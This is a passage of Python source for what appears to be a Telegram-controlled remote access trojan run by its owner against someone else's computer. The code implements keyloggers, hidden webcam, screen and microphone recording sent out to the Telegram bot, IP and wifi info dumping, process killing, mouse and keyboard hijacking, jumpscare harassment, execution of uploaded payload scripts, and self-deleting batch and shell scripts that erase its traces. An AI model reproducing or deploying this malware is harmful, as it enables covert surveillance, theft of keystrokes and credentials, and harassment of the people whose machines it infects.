                else:
                    self.bsend(f"Output: {output}")

        def extract_commands(self) -> list[dict]:
            commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
            return [{'command': cmd, 'description': desc} for cmd, desc in commands]

        def fake_shutdown(self) -> None:
            system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
            system("shutdown -a")

        def gabinetti(self) -> None:
            self.jumpscare("plankton_meme", "gabinetti")

        def handle(self, msg: str) -> None:
            content_type, chat_type, chat_id = glance(msg)
            sender_name = msg["from"]["first_name"] 
            if chat_id == self.owner_id:
                self.owner_name = sender_name
                if content_type == "text":
                   self.parse_text(msg) 
                elif content_type == "photo":
                    self.parse_photo(msg)
                elif content_type == "document":
                    self.parse_document(msg)
                elif content_type == "video":
                    self.parse_document(msg, mimetype="video")
                elif content_type in ("voice", "audio"):
                    self.parse_audio(msg)
                else:
                    self.bsend(f"Unparsed content-type: {content_type}")
            else:
                self.bsend(f"What do you want {sender_name}, I don't work for you.")

        def inverted_screen(self) -> None:
            self.modded_screenshot(invert_image)

        def ipinfo(self):
            output = self.execute("curl ifconfig.co", return_output=True)
            self.bsend(f"🌐 Public IP: {output}")

        def johnpork(self, audio=True) -> None:
            self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)

        def johnporknoaudio(self) -> None:
            self.johnpork(False)

        def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
            old_volume = self.audio_mixer.getVolumePercentage()
            self.audio_mixer.setVolumePercentage(setvolume)
            if image is None:
                image = self.images[choice(list(self.nomemes))]
            else:
                if image in self.images:
                    image = self.images[image]
                else:
                    image = imread(image)
            if audio is None:
                audio = self.audios["ghost-roar"]
            else:
                audio = self.audios[audio]
            imageThread = Thread(target=show_image_fullscreen ,args=(image,))
    
            if showimage:
                imageThread.start()
            if playaudio:
                self.__playsound(audio)
            if showimage:
                imageThread.join()
            self.audio_mixer.setVolumePercentage(old_volume)

        def jumpscarenoaudio(self) -> None:
            self.jumpscare(playaudio=False)

        def keylogger(self, timeout: int=10) -> None:
            buffer = StringIO()
            start=time()
            loading_bar = self.new_loading_bar(timeout, "Keylogger with file", showperc=True)
            while (time()-start)<timeout:
                loading_bar.update(time()-start)
                event = read_event()
                if event.event_type == KEY_DOWN:
                    e = event.name.split()[0]
                    if e in printable:
                        buffer.write(e)
                    else:
                        buffer.write(f"\n{e.upper()}\n")
            buffer.seek(0)
            with buffer:
                self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
            loading_bar.set100()
            loading_bar.delete()

        def leftclick(self) -> None:
            pg.leftClick()

        def live_keylogger(self, timeout=10) -> None:
            start = time()
            buffer = ""
            self.bsend("Live keylogger started")
            while time()-start < timeout:
                event = read_event()
                if event.event_type == KEY_DOWN:
                    e = event.name.split()[0]
                    if e in printable and not(e in " \n\t"):
                        buffer+=e
                    else:
                        self.bsend(f"BUFFER: {buffer}")
                        buffer=""
            self.bsend("Live keylogger done")

        def message_box(self, text: str, title: str = "Warning", style: int = 0x1000) -> int:
            def run():
                ctypes.windll.user32.MessageBoxW(0, text, title, style)
            Thread(target=run, daemon=True).start()

        def mixer_menu(self) -> None:
            buttons = {
                "🔊Full Volume":"/fullvolume",
                "🔉Half Volume":"/setvolume 50",
                "🔇Mute":"/mutevolume",
            }
            self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")

        def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
            filename = join(BURN_DIRECTORY, randompngname())
            pg.screenshot(filename)
            img = imread(filename)
            modded_img = effect(img)
            show_image_fullscreen(modded_img, timeout)

        def mousecontroller(self) -> None:
            menu = {
                "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
                "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
            }
            self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")

        def moused(self) -> None:
            pos = pg.position()
            pg.moveTo(pos[0], pos[1]+MOUSE_JMP)

        def mousel(self) -> None:
            pos = pg.position()
            pg.moveTo(pos[0]-MOUSE_JMP, pos[1])

        def mouser(self) -> None:
            pos = pg.position()
            pg.moveTo(pos[0]+MOUSE_JMP, pos[1])

        def mouseu(self) -> None:
            pos = pg.position()
            pg.moveTo(pos[0], pos[1]-MOUSE_JMP)

        def mouselock(self, timer: int) -> None:
            start = time()
            pos = pg.position()
            while timer > (time()-start):
                pg.moveTo(pos)

        def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
            return EditableMessage(self.bot, self.owner_id, content, autosend)

        def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
            return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 

        def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
            return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)

        def on_callback_query(self, msg) -> None:
            query_id, from_id, data = glance(msg, flavor="callback_query")
            self.parse_command(data) 
            self.bot.answerCallbackQuery(query_id)

        def opencap(self) -> None:
            if not self.cap.isOpened():
                self.cap.open(0)

        def parse_audio(self, msg: dict) -> None:
            if 'voice' in msg:
                file_id = msg['voice']['file_id']
            elif 'audio' in msg:
                file_id = msg['audio']['file_id']
            file_info = self.bot.getFile(file_id)
            file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
            filename = randomname()+".ogg"
            filepath = join(BURN_DIRECTORY, filename)
            response = requests.get(file_url)
            with open(filepath, "wb") as f:
                f.write(response.content) 
            filepath = ogg_to_wav(filepath, rmold=True)
            self.__playsound(filepath)
            remove(filepath)

        def parse_command(self, text: str) -> None:
            args = text.split()
            command = args[0]
    
            if command.startswith("/"):
                command = args[0][1:]
            function_args = args[1:]
            function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
    
            func = self.function_table.get(command)
            if func:
                try:
                    if func in self.no_background_functions:
                        func(*function_args)
                    else:
                        if function_args:
                            thread_args = (*function_args,)
                            new_thread = Thread(target=func, args=thread_args)
                        else:
                            new_thread = Thread(target=func)
                        new_thread.start()
                except TypeError as e:
                    self.bsend(f"Invalid args for function {command}\n{e}")
                except Exception as e:
                    self.bsend(f"Unhandled error for function {command}\n{e}")

            elif command.startswith("PK"):
                if command == "PK_next_page" and self.process_explorer_menu:
                    self.process_killer_page += 1
                    self.process_killer(page=self.process_killer_page)
                elif command == "PK_previous_page" and self.process_explorer_menu:
                    self.process_killer_page -= 1
                    self.process_killer(page=self.process_killer_page)
                elif command == "PK_close_page" and self.process_explorer_menu:
                    self.process_explorer_menu.delete()
                elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                    self.bsend("Use /processkiller first")

            elif command.startswith("DISPLAYSET"):
                if command == "DISPLAYSET_close":
                    if self.display_mode_keyboard:
                        self.display_mode_keyboard.delete()
                        self.display_mode_keyboard = None

            elif command.startswith("MOUSE"):
                if command == "MOUSE_closemenu":
                    if self.mouse_controller_menu:
                        self.mouse_controller_menu.delete()
                        self.mouse_controller_menu = None

            elif command.startswith("MXR"):
                if command == "MXR_close":
                    if self.mixer_menu_keyboard:
                        self.mixer_menu_keyboard.delete()
                        self.mixer_menu_keyboard = None
            else:
                self.bsend(f"Invalid command {command}")

        def parse_document(self, msg: str, mimetype="document") -> None:
            document = msg[mimetype]
            file_id = document["file_id"]
            saved_filename = randomname()
            saved_filepath = join(BURN_DIRECTORY, saved_filename)
            self.bot.download_file(file_id, saved_filepath)
            if mimetype == "document":
                filename = document["file_name"]
                if filename.endswith(".dd"):
                    with open(saved_filepath, "r") as fi:
                        content = fi.read()
                    payload_python = toducky(content)
                    self.bsend(f"Executing duckyscript {filename}({saved_filename})")
                    exec(payload_python)
                    remove(saved_filepath)
    
            elif mimetype == "video":
                caption = msg["caption"].lower().strip()
                if caption == "/setvideowallpaper":
                    duration = document["duration"]
                    video_stream = VideoCapture(saved_filepath)
                    res = True
                    start=time()
                    while res and (time()-start)<=duration:
                        res, frame = video_stream.read()
                        imwrite("tmp.png", frame)
                        change_wallpaper(abspath("tmp.png"))
                    remove("tmp.png")
                    self.restore_wallpaper()

        def parse_photo(self, msg: dict) -> None:
            filename = randompngname()
            filepath = join(BURN_DIRECTORY, filename)
            self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
            if "caption" in msg.keys():
                if msg["caption"] == "/jumpscare":
                    self.jumpscare(filepath)
                    return
            Thread(target=self.show_image, args=[filepath,]).start()
            sleep(0.5)
            remove(filepath)

        def parse_text(self, msg: dict) -> None:
            text = msg["text"]
            if text == "/start":
                return None
            elif ";" in text:
                commands = text.split(";")
                for command in commands:
                    self.parse_command(command) 
            else:
                self.parse_command(text)

        def plankton(self, audio=True) -> None:
            self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)

        def planktonnoaudio(self) -> None:
            self.plankton(audio=False)

        def process_killer(self, page=0) -> None:
            if self.process_explorer_menu is None:
                self.process_killer_page = 0
            else:
                self.process_explorer_menu.delete()
                self.process_killer_page = page
            processes = [x.name() for x in psutil.process_iter()] 
            self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
            return self.process_explorer_menu.send_keyboard()

        def pss(self) -> None:
            self.__play_loaded_sound("pss")

        def quickmenu(self) -> int:
            buttons = {
                "selfie":"selfie",
                "Screenshot":"screenshot",
                "Jumpscare":"jumpscare",
                "Plankton":"plankton",
                "ALT F4":"altf4",
                "Psst..":"pss",
                "Webcam Clip (5s)":"webcamclip",
                "Screen Clip (5s)":"screenclip",
                "Full Clip (5s)":"fullclip",
                "Microphone Clip (5s)":"microphone",
            }
            menu = self.new_menu(buttons, autosend=False)
            return menu.send_keyboard()

        def randomkeyboard(self, timeout: int =5) -> None:
            start = time()
            loading_bar = self.new_loading_bar(timeout, label="Random Keyboard", showperc=True)
            while (time()-start)<timeout:
                loading_bar.update(time()-start)
                event = read_event()
                if event.event_type == KEY_DOWN:
                    e = event.name.split()[0]
                    if e in printable:
                        pg.press("backspace")
                        pg.write(choice(printable))
            loading_bar.set100()
            loading_bar.delete()

        def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
            try:
                seconds = float(seconds)
                frames = int(seconds * samplerate)
                data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
                sd.wait()
                sf.write(filename, data, samplerate)
                return True
            except Exception as e:
                return e 

        def record_jumpscare_reaction(self, onlycamera=False) -> None:
            if onlycamera:
                recording_thread = Thread(target=self.record_webcam, args=(20,))
            else:
                recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))
    
            recording_thread.start()
            status_message = self.new_editable_message("Recording")
            sleep(10)
            self.jumpscare(playaudio=True)
            status_message.edit("Jumpscared!")
            recording_thread.join()
            status_message.delete()

        def record_screen(self, duration: int=5, caption: str|None=None) -> None:
            duration = int(duration)
            bar = self.new_loading_bar(duration, label="Recording Screen")
            try:
                filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
                audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
                SCREEN_SIZE = tuple(pg.size())
                fourcc = VideoWriter_fourcc(*'XVID')
                out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
                start_time = time()
                samplerate = 44100
                channels = 1
                frames = int(duration * samplerate)
                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
    
                time_elapsed = 0
                while int(time_elapsed) < duration:
                    time_elapsed = time() - start_time
                    bar.progress = time_elapsed
                    bar.update()
                    img = pg.screenshot()
                    img = np.array(img)
                    img = cvtColor(img, COLOR_BGR2RGB)
                    out.write(img)
                bar.set100()
    
                sd.wait()
                out.release()
                sf.write(audio_filename, audio_data, samplerate)
                video_clip = VideoFileClip(filename)
                audio_clip = AudioFileClip(audio_filename)
                video_with_audio = video_clip.set_audio(audio_clip)
                final_filename = filename.replace(".mp4", "_final.mp4")
                video_with_audio.write_videofile(final_filename, logger=None)
                tmploadingmessage = self.new_editable_message("Sending recording...", True)
                with open(final_filename, "rb") as video:
                    self.bot.sendVideo(self.owner_id, video, caption=caption)
                tmploadingmessage.delete()
                remove(filename)
                remove(audio_filename)
                remove(final_filename)
            except Exception as e:
                self.bsend(f"Error while recording screen: {e}")
            bar.fill_and_delete()

        def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
            duration = int(duration)
            bar = self.new_loading_bar(duration, label="Recording Webcam")
            try:
                filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
                audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
                fourcc = VideoWriter_fourcc(*'XVID')
                self.opencap()
                webcam = self.cap
                width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
                height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
                out = VideoWriter(filename, fourcc, 20.0, (width, height))
                start_time = time()
                samplerate = 44100
                channels = 1
                frames = int(duration * samplerate)
                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
                time_elapsed = 0
                while int(time_elapsed) < duration:
                    time_elapsed = time() - start_time
                    bar.progress = time_elapsed
                    bar.update()
                    ret, frame = webcam.read()
                    if not ret:
                        break
                    out.write(frame)
                bar.set100()
                sd.wait()
                out.release()
                self.closecap()
                sf.write(audio_filename, audio_data, samplerate)
                video_clip = VideoFileClip(filename)
                audio_clip = AudioFileClip(audio_filename)
                video_with_audio = video_clip.set_audio(audio_clip)
                final_filename = filename.replace(".mp4", "_final.mp4")
                video_with_audio.write_videofile(final_filename, logger=None)
                tmploadingmessage = self.new_editable_message("Sending recording...", True)
                with open(final_filename, "rb") as video:
                    self.bot.sendVideo(self.owner_id, video, caption=caption)
                tmploadingmessage.delete()
                remove(filename)
                remove(audio_filename)
                remove(final_filename)
            except Exception as e:
                self.bsend(f"Error while recording webcam {e}")
            bar.fill_and_delete()

        def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
            capture_duration = int(capture_duration)
            bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
            try:
                filename = join(BURN_DIRECTORY, randomname() + ".mp4")
                audio_filename = join(BURN_DIRECTORY, randomname() + ".wav")
                SCREEN_SIZE = tuple(pg.size())
                fourcc = VideoWriter_fourcc(*'XVID')
                out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
                self.opencap()
                webcam = self.cap
                start_time = time()
                samplerate = 44100
                channels = 1
                frames = int(capture_duration * samplerate)
                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
    
                time_elapsed = 0 
                while int(time_elapsed) < capture_duration:
                    time_elapsed = time() - start_time
                    bar.progress = time_elapsed
                    bar.update()
                    img = pg.screenshot()
                    img = np.array(img)
                    img = cvtColor(img, COLOR_BGR2RGB)
                    _, frame = webcam.read()
                    fr_height, fr_width, _ = frame.shape
                    frame = resize(frame, (fr_width//2, fr_height//2))
                    fr_height, fr_width, _ = frame.shape
                    img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                    out.write(img)
                bar.set100()
                sd.wait()
                out.release()
                self.closecap()
                sf.write(audio_filename, audio_data, samplerate)
                video_clip = VideoFileClip(filename)
                audio_clip = AudioFileClip(audio_filename)
                video_with_audio = video_clip.set_audio(audio_clip)
                final_filename = filename.replace(".mp4", "_final.mp4")
                video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
                tmploadingmessage = self.new_editable_message("Sending recording...", True)
                with open(final_filename, "rb") as video:
                    self.bot.sendVideo(self.owner_id, video, caption=caption)
                tmploadingmessage.delete()
                remove(filename)
                remove(audio_filename)
                remove(final_filename)
            except Exception as e:
                e = traceback.format_exc()
                self.bsend(f"Error while sending video clip\n{e}")
            bar.fill_and_delete()

        def removefromcantopen(self, process: str) -> None:
            self.cantopenlist.remove(process)
            self.bsend(f"Removed {process} to cantopenlist.")

        def restore_wallpaper(self) -> None:
            change_wallpaper(self.backup_wallpaper_path)

        def rightclick(self) -> None:
            pg.rightClick()

        def screenshot(self) -> int:
            try:
                filename = join(BURN_DIRECTORY,randompngname())
                screenshot = pg.screenshot()
                screenshot.save(filename)
                message_id = self.__send_image(filename)
                remove(filename)
                return message_id
            except Exception as e:
                return self.bsend(f"Error while getting screenshot\n{e}")

        def selfie(self, caption: str|None=None) -> None:
            try:
                filename = join(BURN_DIRECTORY,randompngname())
                self.opencap()
                camera = self.cap
                return_value, image = camera.read()
                if not return_value:
                    raise Exception("Could not find camera")
                imwrite(filename, image)
                self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
                remove(filename)
                self.closecap()
                return True
            except Exception as e:
                self.bsend(f"Something has happened while getting webcam\n {e}")
                return False

        def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
            message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
            filename = randomname()+".wav"
            filepath = join(BURN_DIRECTORY, filename)
            res = self.record_audio(filepath, seconds)
            if isinstance(res, Exception):
                err = f"Error while recording audio: {res}"
                self.bsend(err)
            else:
                message.edit("Done recording, sending...")
                filepath = wav_to_ogg(filepath, rmold=True)
                with open(filepath, "rb") as fi:
                    self.bot.sendVoice(self.owner_id, fi, caption=caption)
                remove(filepath)
                message.delete()

        def setCameraAsWallpaper(self, seconds: float|int=5):
            seconds = int(seconds)
            loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
            filename = join(BURN_DIRECTORY, "jxframe.png")
            start = time()
            res = True
            self.opencap()
            while time()-start <= seconds and res:
                loading_bar.update(time()-start)
                res, frame = self.cap.read()
                frame = pad_to_16_9(frame)
                imwrite(filename, frame)
                change_wallpaper(filename)
            loading_bar.set100()
            self.closecap()
            sleep(1)
            try:
                remove(filename)
            except FileNotFoundError:
                ...
            loading_bar.delete()
            self.restore_wallpaper()

        def set_volume(self, volume):
            if volume in range(0, 101):
                self.audio_mixer.setVolumePercentage(volume)
            else:
                self.bsend(f"Volume must be from 0.0 to 100.0")

        def setvideowallpaper(self, videofilename: str):
            res = True
            filename = join(BURN_DIRECTORY, "jxframe.png")
            backup_filename = join(BURN_DIRECTORY, "backup.png")
            self.opencap()
            video = VideoCapture(abspath(videofilename))
            while res:
                res, frame = video.read()
                imwrite(frame)
                change_wallpaper(filename)
            change_wallpaper(backup_filename)
            remove(filename)
            remove(backup_filename)
            self.closecap()
            self.restore_wallpaper()

        def show_image(self, image_path: str) -> None:
            try:
                imshow("Warning", resize(imread(image_path), (400, 400)))
                setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
                waitKey(0)
                destroyWindow("Warning")
                remove(image_path)
            except Exception as e:
                self.bsend(f"Error while trying to show image: \n{e}")

        def shutdown(self, seconds=0) -> None:
            system(f"shutdown -s -t {seconds}")

        def spam_windows(self, n: int, text: str) -> None:
            for i in range(n):
                sp_win = Thread(target=self.message_box, args=["Warning", text,])
                sp_win.start()

        def start(self) -> None:
            try:
                self.bot.deleteWebhook()
            except MaxRetryError:
                sys.exit() 
            self.update_commands()
            self.images = load_images()
            nomemes = list(self.images.copy().keys())
            self.nomemes = filter(lambda x: not("meme" in x), nomemes)
            self.audios = load_audios()
            self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
            self.cantopenthread = Thread(target=self.cantopenkiller)
            self.cantopenthread.start()
            self.screen_width, self.screen_height = pg.size()
            botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
            if not sys.argv[1:]:
                if not self.selfie(botstartedmessage):
                    self.bsend(botstartedmessage)
            else:
                self.bsend(botstartedmessage)
            loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
            loop.run_as_thread()
            while 1:
                try:
                    sleep(0.01)
                except KeyboardInterrupt:
                    self.bsend("🛑 Interrupted by host machine, bye bye.")
                    self.clear()
                    break

        def stop(self) -> None:
            self.bsend("🛑 Interrupted by you, bye bye.")
            sys.exit()

        def terminate_process_by_name(self, process_name: str) -> None:
            for proc in psutil.process_iter():
                if proc.name().lower() == process_name.lower().strip():
                    proc.terminate()

        def update_commands(self) -> bool:
            commands = self.extract_commands()
            url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
            payload = {'commands': commands}
            response = requests.post(url, json=payload)
            return response.status_code == 200

        def selfdestruction(self) -> None:
            current_file = realpath(sys.argv[0])
            temp_dir = gettempdir()
            if iswindows:
                bat_file = join(temp_dir, "delete_me.bat")
                with open(bat_file, "w") as f:
                    f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
                Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
            else:
                sh_file = join(temp_dir, "delete_me.sh")
                with open(sh_file, "w") as f:
                    f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                chmod(sh_file, 0o700)
                Popen(['sh', sh_file]) 
            self.stop()

        def waitforface(self, timeout=60):
            start = time()
            self.opencap()
            cap = self.cap
            while time()-start < timeout:
                res, frame = detect_face(cap)
                if frame is None:
                    self.bsend("Face recognition model not loaded properly.")
                    break
                if res:
                    filename = randompngname()
                    imwrite(filename, frame)
                    self.__send_image(filename)
                    remove(filename)
                    break
            self.closecap()

        def wifiinfo(self) -> None:
            self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")

if __name__ == "__main__":
    token, chat_id = getCred() 
    mixer = CustomMixer()
    capture = VideoCapture(0)
    pep2 = PeppinoTelegram(token,chat_id,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
    pep2.start()